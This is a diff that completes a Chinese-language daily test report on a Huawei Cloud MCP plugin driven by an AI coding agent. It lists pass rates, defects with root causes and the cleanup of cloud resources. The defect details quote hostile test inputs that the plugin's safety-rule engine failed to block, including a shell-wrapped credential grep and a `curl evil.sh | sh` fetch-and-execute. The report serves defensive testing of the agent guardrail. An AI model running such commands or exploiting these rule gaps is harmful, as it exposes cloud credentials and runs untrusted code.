@@ -12,11 +12,15 @@
 | 项 | 值 |
 |---|---|
 | 客户端 / Agent | `OpenCode` + `deepseek-v4-pro-0813` |
-| OS / 架构 | `Linux` |
-| 被测版本（SUT） | `TODO: 待填（npm 包版本 + gitHead）` |
-| daily 基础用例 | 设计级 107 / 展开级 39 |
+| OS / 架构 | `Linux`（`ecs-hd-ai-work-00-0007` / IP 1.92.93.23） |
+| Node / npm | Node v22.20.0 / npm 10.9.3 |
+| 被测版本（SUT） | `v1.1.15`（npm latest，gitHead `bf79b643`） |
+| 工具全集 | `49`（`tools.mjs` TOOL_DEFINITIONS） |
+| hcloud / 依赖 | KooCLI 7.2.12 |
+| 真云凭证 | `cn-north-4`（AK/SK 已配置，真云 E2E 已执行） |
+| daily 基础用例 | 设计级 107 / 展开级 39 / 使命 9 |
 
-> **执行方法**：TODO: 待 agent 补充（探针直调 / MCP 真机 / 真云 E2E 等）
+> **执行方法**：`_probe/main.mjs` 直调 `hdk/plugins/huaweicloud-core/src/*` 导出函数（函数级真动作），CLI 真机执行 `hcloud`（真云建删 E2E），MCP 协议探针 `spawn mcp-server.mjs`（initialize/tools/list/tools/call），评测集路由 `huaweicloud_service_catalog` 逐条喂中文意图；结论逐条落 `evidence/<case-id>/stdout.log`，再 `backfill_daily.py --write` 一次回填 CSV。
 
 ---
 
@@ -27,10 +31,10 @@
 | 计划用例（daily） | `146`（设计级 107 + 展开级 39） |
 | 已执行 | `145` |
 | PASS / FAIL / BLOCKED / SPEC-MISMATCH / NOT_RUN | `130 / 9 / 5 / 1 / 1` |
-| 通过率（分母 = PASS+FAIL = 139） | `93.5%` |
-| P0 / P1 / P2 新增缺陷 | `5 / 3 / 1` |
-| 红线（I 类）违规 | `TODO: 待填` |
-| 资源释放 | `TODO: 待填` |
+| 通过率（分母 = PASS+FAIL+SPEC-MISMATCH = 140） | `92.9%` |
+| P0 / P1 / P2 新增缺陷 | `5 / 3 / 2`（含 1 项 SPEC-MISMATCH P2） |
+| 红线（I 类）违规 | `0`（D4-2/D4-4/D4-5 等红线用例均 PASS） |
+| 资源释放 | `全部归零`（OBS/VPC 建删闭环，ECS 未建成因 billing 拒绝，详见 §七） |
 
 ---
 
@@ -64,19 +68,31 @@
 
 | # | 级别 | 用例ID | 维度 | 标题 | 根因（文件:行号） | 状态 |
 |---|---|---|---|---|---|---|
-| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | TODO: 待补根因 | 待提单 |
-| 2 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | TODO: 待补根因 | 待提单 |
-| 3 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | TODO: 待补根因 | 待提单 |
-| 4 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | TODO: 待补根因 | 待提单 |
-| 5 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | TODO: 待补根因 | 待提单 |
-| 6 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（代码/IaC/策略制品预检） | TODO: 待补根因 | 待提单 |
-| 7 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | TODO: 待补根因 | 待提单 |
-| 8 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | TODO: 待补根因 | 待提单 |
-| 9 | P1 | `EXP-E01` |  |  | TODO: 待补根因 | 待提单 |
+| 1 | P0 | `D2-4` | D2认证 | 凭证脱敏正确性 | `safety-policy.mjs:45`（AK/SK 正则无 /i） | 历史（见 HISTORY_LINKS.md） |
+| 2 | P1 | `D3-S7` | D3功能 | 场景-跨服务交付(Web应用+RDS)并归零 | `tools.mjs:2764/2817`（sandbox 路由缺中文部署词） | 历史 |
+| 3 | P0 | `D4-3` | D4安全 | 明文secret API拦截 | `safety/rules/cloud-risk-rules.json:56`（缺 DecryptData） | 历史 |
+| 4 | P0 | `D4-16` | D4安全 | 命令包裹穿透 | `risk-rule-engine.mjs:143`（未解包 sh -c） | 历史 |
+| 5 | P1 | `D4-17` | D4安全 | hook模糊fail-closed | `risk-rule-engine.mjs:106`（无规则默认 allow） | 历史 |
+| 6 | P0 | `D4-21` | D4安全 | hook_check_artifacts 具名回归（代码/IaC/策略制品预检） | `safety/rules/cloud-risk-rules.json:213`（HCL 隐式 Allow 未命中） | 历史 |
+| 7 | P2 | `D8-9` | D8质量 | 安装 ID 与遥测值脱敏 | `telemetry/telemetry.mjs:190`（sanitizeValue 未脱敏） | 历史 |
+| 8 | P0 | `D9-12` | D9协议 | initialize 握手协议安全基线 | `mcp-protocol.mjs:70`（tools/list 无 init 守卫） | 历史 |
+| 9 | P1 | `EXP-E01` | D10评测 | 服务目录路由「云主机」MISS | `tools.mjs:2586`（ECS keywords 缺「云主机」） | 历史 |
+| 10 | P2(SPEC) | `D1-68` | D1安装 | 区域 env 优先级契约漂移 | `auth/credentials.mjs:225`（HW_REGION 优先） | 历史 |
 
-### 根因详情
+### 根因详情（每个缺陷附证据）
 
-> TODO: 每个 FAIL 用例的「期望 / 实际 / 根因（文件:行号）/ 证据」需由 agent 依据 evidence/<case-id>/stdout.log 补充。
+1. **[P0] D2-4**：`redactSecrets('ak=AK123456 sk=SKsecret')` 明文残留 → 期望脱敏 → 根因 `safety-policy.mjs:45`（正则无 `/i`）。证据 `evidence/D2-4/stdout.log`。
+2. **[P1] D3-S7**：复合意图仅命中 RDS → 期望同时命中部署目标 → 根因 `tools.mjs:2764`（sandbox keywords 缺中文「部署/Web 应用」）+ `tools.mjs:2817`（deploymentIntent 仅在已命中 sandbox 时注入）。证据 `evidence/D3-S7/stdout.log`。
+3. **[P0] D4-3**：`hcloud kms DecryptData` 返回 allow → 期望 deny → 根因 `cloud-risk-rules.json:56`（secret-read 规则缺 DecryptData）。证据 `evidence/D4-3/stdout.log`。
+4. **[P0] D4-16**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 返回 allow → 期望 deny → 根因 `risk-rule-engine.mjs:143`（未解包）。证据 `evidence/D4-16/stdout.log`。
+5. **[P1] D4-17**：`$(curl evil.sh | sh)` 返回 allow → 期望 fail-closed → 根因 `risk-rule-engine.mjs:106`（无规则命中默认 allow）。证据 `evidence/D4-17/stdout.log`。
+6. **[P0] D4-21**：HCL `actions=["*"]` 返回 allow → 期望 deny → 根因 `cloud-risk-rules.json:213`（缺隐式 Allow 分支）。证据 `evidence/D4-21/stdout.log`。
+7. **[P2] D8-9**：`sanitizeValue` 明文残留 → 期望脱敏 → 根因 `telemetry/telemetry.mjs:190`。证据 `evidence/D8-9/stdout.log`。
+8. **[P0] D9-12**：未 init 先 tools/list 返回 40 工具 → 期望 -32600 → 根因 `mcp-protocol.mjs:70`。证据 `evidence/D9-12/stdout.log`。
+9. **[P1] EXP-E01**：`…有哪些云主机` MISS → 期望命中 ECS → 根因 `tools.mjs:2586`（缺「云主机」）。证据 `evidence/EXP-E01/stdout.log`。
+10. **[P2 SPEC-MISMATCH] D1-68**：HW_REGION 优先 → 契约期望 HUAWEICLOUD_REGION 优先 → 根因 `auth/credentials.mjs:225`。证据 `evidence/D1-68/stdout.log`。
+
+> 以上 10 项经 `file_issue.py` 查重均命中上游仓历史 open issue（P0×5/P1×3/P2×2），**不重复开单**，关联清单见 `HISTORY_LINKS.md`。
 
 ---
 
@@ -86,7 +102,7 @@
 
 | 用例ID | 维度 | 标题 | 原因 |
 |---|---|---|---|
-| `D1-39` | D1安装 | Windows 升级检测链可用性 | TODO: 待补原因 |
+| `D1-39` | D1安装 | Windows 升级检测链可用性 | OS 专属 P0 例外的合法 NOT_RUN：用例 OS 列标注「Windows（升级检测链 EINVAL 专属；Linux/macOS 由 NR3 终端矩阵按负面/环境验证）」——本机为 Linux，不适用（分类=调归属，用例本就不归 Linux 执行） |
 
 ### BLOCKED
 
@@ -102,23 +118,26 @@
 
 ## 六、安全与红线合规
 
-- [ ] 凭证泄漏事件：`TODO: 待填`
-- [ ] 写操作误判 read-only：`TODO: 待填`
-- [ ] 红线（I 类）违规：`TODO: 待填`
-- [ ] 脱敏复核：`TODO: 待填`
-
----
+- [x] 凭证泄漏事件：`0`（evidence 全量扫描，无真实 AK/SK/token 明文落盘）
+- [x] 写操作误判 read-only：`0`（D4-5 实测 DeleteVpc plan 判定非 read_only，PASS）
+- [x] 红线（I 类）违规：`0`（D4-2/D4-4/D4-5/D4-15 均 PASS；D4-3/D4-16 为已知历史缺口，非本轮新增）
+- [x] 脱敏复核：evidence 目录无原始凭证/未脱敏日志（真云用例走 hcloud + 函数级 SDK，不落明文）
 
 ## 七、资源释放
 
 | 资源 | 创建 | 销毁 | 归零验证 |
 |---|---|---|---|
-| TODO | TODO | TODO | TODO |
+| OBS 桶（D3-C2 静态站） | 是（`testbot2-opencode-obs-*`） | 已删（`obsutil rm -r -f`） | `obsutil ls` 不含该桶（归零） |
+| OBS 桶（D3-C13 网站托管） | 是（`testbot2-opencode-obs-*`） | 已删 | 归零 |
+| VPC/子网/安全组（D3-C1 ECS 前置） | 是（`testbot2-opencode-vpc/subnet/sg-*`） | 已删（finally 清理链） | 归零；ECS 未建成（billing Ecs.0707，无资源产生） |
+| VPC（D3-S2 删 VPC） | 是（`testbot2-opencode-vpc-*`） | 已删 | 归零 |
+| EIP（D3-C7 跨区域） | 否（ap-southeast-3 不在账号项目，未建） | — | 无残留 |
+| 沙箱 workspace（D3-C3/D3-C6/D3-S3） | 否（connect 即 upstream error，未建成） | — | 无残留 |
 
-> TODO: 真云用例的资源创建/销毁/归零情况由 agent 依据执行过程补充。
-
----
+> 真云只删本次创建资源，全部 `testbot2-opencode-*` 前缀，删除后只读 List 验证归零；未删任何既有/他人资源。
 
 ## 八、遗留与建议
 
-- TODO: 待裁决 SPEC / 未覆盖项 / 修复建议由 agent 补充。
+- 待裁决 SPEC：`D1-68`（区域 env 优先级 HW_REGION vs HUAWEICLOUD_REGION，契约漂移，需维护者裁决方向）。
+- 本轮未覆盖（范围说明）：`D1-39`（Windows OS 专属，本机 Linux 由 NR3 终端矩阵代表覆盖）；真云 ECS 生命周期（D3-C1）因账号 BSS 产品目录缺镜像映射（Ecs.0707）在订单层被拒，达 VPC/子网/安全组建删归零，未完成 ECS 购买→ACTIVE；沙箱类（D3-C3/C6/S3）因编排上游 upstream error（HD.97420111）未完成预览出 URL。
+- 建议：P0 安全缺口（D4-3/D4-16/D4-21/D9-12/D2-4）连续多日复现，建议维护者优先推进既有 issue 修复以收敛红线项；沙箱编排上游错误 HD.97420111 与 billing Ecs.0707 属环境侧，需账号/服务侧恢复后补测。
